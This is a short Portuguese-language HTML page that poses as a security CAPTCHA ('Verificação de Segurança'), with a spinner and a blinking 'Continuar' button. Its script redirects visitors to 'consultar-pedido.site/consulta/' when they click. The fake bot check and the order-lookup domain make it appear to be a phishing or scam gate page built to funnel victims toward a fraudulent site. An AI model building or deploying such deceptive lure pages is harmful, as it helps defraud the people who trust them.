<!DOCTYPE html><html lang="pt-br"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificação de Segurança</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #ffe600;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .captcha-box {
      background-color: #fff;
      padding: 40px 20px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 90%;
    }
    h2 {
      color: #003366;
      margin-bottom: 20px;
    }
    p {
      font-size: 14px;
      color: #000;
      margin-bottom: 30px;
    }
    button {
      background-color: #003366;
      color: white;
      font-weight: bold;
      padding: 12px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      animation: blink 1.2s infinite;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.6; }
    }
    .loader {
      width: 100px;
      height: 100px;
      margin: 0 auto 20px;
      border: 8px solid #ccc;
      border-top: 8px solid #003366;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="captcha-box">
  <h2>Verificação de Segurança</h2>
  <div class="loader"></div>
  <p>Confirme que você não é um robô para continuar.</p>
  <form id="continueForm">
    <input type="hidden" id="codigo" name="codigo">
    <button type="submit">Continuar</button>
  </form>
</div>

<script>
  document.getElementById("continueForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Evita o envio tradicional do formulário
    // Aqui você coloca o link de destino:
    window.location.href = "https://consultar-pedido.site/consulta/"; 
  });
</script>
